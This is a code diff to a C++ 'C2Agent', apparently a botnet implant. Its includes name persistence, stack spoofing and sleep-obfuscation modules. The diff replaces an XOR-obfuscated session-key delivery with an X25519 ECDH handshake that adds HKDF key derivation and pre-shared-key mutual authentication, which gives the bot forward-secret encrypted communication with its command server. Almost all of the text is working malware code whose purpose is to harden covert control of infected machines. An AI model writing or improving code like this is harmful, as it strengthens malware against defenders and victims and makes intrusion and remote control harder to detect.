@@ -8,6 +8,7 @@
 #include "persistence.h"
 #include "stack_spoof.h"
 #include "sleep_obfuscation.h"
+#include "keyexchange.h"   // ECDH handshake: X25519 + HKDF + mutual auth PSK
 
 #include <iostream>
 #include <sstream>
@@ -252,41 +253,165 @@ bool C2Agent::connectToServer() {
     // Send identification — raw TCP send
     sendIdentification();
 
-    DBG("[DEBUG] Waiting for SESSION_KEY from server...\n");
-    // Receive session key from server — raw TCP recv.
-    char buf[4096] = {0};
-    int n = sock_recv(client_socket, buf, sizeof(buf) - 1, 0);
-    DBG("[DEBUG] recv returned: %d bytes\n", n);
-    if (n > 0) {
-        string response(buf, n);
-        string unwrapped = unwrapFromTransport(response);
-        // XOR-decode the obfuscated key exchange (matches server: 0x5A)
-        for (size_t _kx = 0; _kx < unwrapped.size(); _kx++) unwrapped[_kx] ^= 0x5A;
-        if (unwrapped.substr(0, 12) == "SESSION_KEY:") {
-            string key_data = unwrapped.substr(12, 32);
-            memcpy(session_key, key_data.c_str(), 32);
-            session_encryption = true;
-            connected = true;  // Only set connected after successful key exchange
+    // ============================================================================
+    // ECDH HANDSHAKE (4 messages — replaces the old SESSION_KEY delivery):
+    //   1. bot → srv: BOT_CONNECT:<id>              (sent above, XOR 0x55)
+    //   2. srv → bot: SESSION_PUB:<srv_eph_pub>      (XOR 0x5A, wrapped)
+    //   3. bot → srv: CLIENT_PUB:<bot_eph_pub><confirm_mac>   (XOR 0x55, wrapped)
+    //   4. srv → bot: AUTH_OK:<auth_mac>             (XOR 0x5A, wrapped)
+    //
+    // Session key = HKDF(X25519(eph,eph), transcript incl. bot_id) — derived
+    // locally on BOTH sides, never transmitted → forward secrecy. The confirm
+    // MAC (step 3) proves the bot knows the PSK; AUTH_OK (step 4) proves the
+    // server does → mutual authentication. PSK: RSW_PSK env → psk.txt → "".
+    //
+    // Framing: each server message is wrapForTransport (4B BE len + cksum).
+    // TCP may split frames across recv() calls, so we accumulate until the
+    // length header says the frame is complete (8s SO_RCVTIMEO bounds each
+    // recv — handshake can't hang forever).
+    // ============================================================================
+    DBG("[DEBUG] ECDH handshake: waiting for SESSION_PUB...\n");
+    string hs_accum;
+    string hs_msg;              // XOR-decoded SESSION_PUB payload
+    bool got_session_pub = false;
+    while (true) {
+        char hbuf[2048];
+        int m = (int)sock_recv(client_socket, hbuf, sizeof(hbuf), 0);
+        if (m <= 0) {
+            if (m < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
+                DBG("[DEBUG] recv TIMEOUT (SO_RCVTIMEO=8s) awaiting SESSION_PUB — server rejected BOT_CONNECT or is not ECDH-capable\n");
+            } else {
+                DBG("[DEBUG] connection closed while awaiting SESSION_PUB (errno=%d)\n", errno);
+            }
+            break;
+        }
+        hs_accum.append(hbuf, m);
+        if (hs_accum.size() >= 5) {
+            size_t flen = ((unsigned char)hs_accum[0] << 24) |
+                          ((unsigned char)hs_accum[1] << 16) |
+                          ((unsigned char)hs_accum[2] << 8) |
+                          (unsigned char)hs_accum[3];
+            if (flen > 0x0FFFFFFF) {          // corrupt — give up
+                DBG("[DEBUG] corrupt SESSION_PUB frame header\n");
+                break;
+            }
+            if (hs_accum.size() >= 5 + flen) {
+                string frame = hs_accum.substr(0, 5 + flen);
+                hs_msg = unwrapFromTransport(frame);
+                if (hs_msg.size() != frame.size()) {     // unwrap succeeded
+                    for (auto& ch : hs_msg) ch ^= 0x5A;  // server→bot XOR key
+                    got_session_pub = true;
+                } else {
+                    DBG("[DEBUG] SESSION_PUB checksum mismatch\n");
+                }
+                break;
+            }
+        }
+    }
 
-            // Update global state for sleep obfuscation
-            memcpy(c2_session_key, session_key, 32);
-            c2_server_ip = server_ip;
-            c2_bot_id = bot_id;
-            c2_state_initialized = true;
+    bool handshake_ok = false;
+    if (got_session_pub && hs_msg.size() >= 12 + 32 &&
+        hs_msg.substr(0, 12) == "SESSION_PUB:") {
+        uint8_t srv_pub[32];
+        memcpy(srv_pub, hs_msg.data() + 12, 32);
+
+        // ---- Ephemeral keypair + local session key derivation ----
+        uint8_t bot_priv[32], bot_pub[32], shared[32];
+        if (x25519Keypair(bot_priv, bot_pub) != 0) {
+            DBG("[DEBUG] CSPRNG failure — cannot generate ECDH keypair\n");
         } else {
-            DBG("[DEBUG] Response doesn't start with SESSION_KEY, got: %s\n", unwrapped.substr(0, 30).c_str());
-            sock_close(client_socket);
-            client_socket = -1;
-            return false;
+            x25519(shared, bot_priv, srv_pub);
+            deriveSessionKey(shared, srv_pub, bot_pub, bot_id, session_key);
+            memset(bot_priv, 0, sizeof(bot_priv));
+            memset(shared, 0, sizeof(shared));
+
+            string psk = loadPsk();
+            uint8_t confirm_mac[32];
+            computeConfirmMac(psk, srv_pub, bot_pub, confirm_mac);
+
+            // ---- Step 3: CLIENT_PUB:<bot_pub><confirm_mac>, XOR 0x55 ----
+            string msg = "CLIENT_PUB:" +
+                         string((char*)bot_pub, 32) +
+                         string((char*)confirm_mac, 32);
+            for (auto& ch : msg) ch ^= 0x55;
+            string wrapped = wrapForTransport(msg);
+
+            bool send_ok = true;
+            size_t sent = 0;
+            while (sent < wrapped.length()) {
+                int w = (int)sock_send(client_socket, wrapped.c_str() + sent,
+                                       (int)(wrapped.length() - sent), 0);
+                if (w <= 0) { send_ok = false; break; }
+                sent += (size_t)w;
+            }
+
+            // ---- Step 4: AUTH_OK:<auth_mac>, XOR 0x5A, framed ----
+            if (send_ok) {
+                string aaccum;
+                bool got_auth = false;
+                string auth_payload;
+                while (true) {
+                    char abuf[1024];
+                    int a = (int)sock_recv(client_socket, abuf, sizeof(abuf), 0);
+                    if (a <= 0) {
+                        DBG("[DEBUG] connection closed/timeout awaiting AUTH_OK\n");
+                        break;
+                    }
+                    aaccum.append(abuf, a);
+                    if (aaccum.size() >= 5) {
+                        size_t alen = ((unsigned char)aaccum[0] << 24) |
+                                      ((unsigned char)aaccum[1] << 16) |
+                                      ((unsigned char)aaccum[2] << 8) |
+                                      (unsigned char)aaccum[3];
+                        if (alen > 0x0FFFFFFF) break;
+                        if (aaccum.size() >= 5 + alen) {
+                            string af = aaccum.substr(0, 5 + alen);
+                            auth_payload = unwrapFromTransport(af);
+                            if (auth_payload.size() != af.size()) {
+                                for (auto& ch : auth_payload) ch ^= 0x5A;
+                                got_auth = true;
+                            }
+                            break;
+                        }
+                    }
+                }
+
+                if (got_auth && auth_payload.size() >= 8 + 32 &&
+                    auth_payload.substr(0, 8) == "AUTH_OK:") {
+                    uint8_t auth_mac[32], expect[32];
+                    memcpy(auth_mac, auth_payload.data() + 8, 32);
+                    computeAuthMac(psk, srv_pub, bot_pub, bot_id, expect);
+                    if (constantTimeEqual(expect, auth_mac, 32)) {
+                        handshake_ok = true;   // mutual auth complete
+                    } else {
+                        DBG("[DEBUG] AUTH_OK MAC mismatch — server PSK missing or wrong\n");
+                    }
+                } else if (got_auth) {
+                    DBG("[DEBUG] malformed AUTH_OK payload\n");
+                } else {
+                    DBG("[DEBUG] AUTH_OK frame corrupt or not received\n");
+                }
+            }
         }
+    } else if (got_session_pub) {
+        DBG("[DEBUG] Expected SESSION_PUB, got: %.30s\n", hs_msg.c_str());
+    }
+
+    if (handshake_ok) {
+        session_encryption = true;
+        connected = true;   // Only after full mutual-auth handshake
+
+        // Update global state for sleep obfuscation
+        memcpy(c2_session_key, session_key, 32);
+        c2_server_ip = server_ip;
+        c2_bot_id = bot_id;
+        c2_state_initialized = true;
     } else {
-        // Distinguish timeout (SO_RCVTIMEO fired) from connection-closed/error
-        // so the operator can tell whether the server is silent vs actively dropping us.
-        if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
-            DBG("[DEBUG] recv TIMEOUT (SO_RCVTIMEO=8s fired, errno=%d) — server didn't send SESSION_KEY. Likely BOT_CONNECT was malformed/rejected on server side.\n", errno);
-        } else {
-            DBG("[DEBUG] recv returned %d — connection closed or error (errno=%d)\n", n, errno);
-        }
+        DBG("[DEBUG] ECDH handshake failed\n");
+        memset(session_key, 0, sizeof(session_key));
+        sock_close(client_socket);
+        client_socket = -1;
+        return false;
     }
 
     // ============================================================================
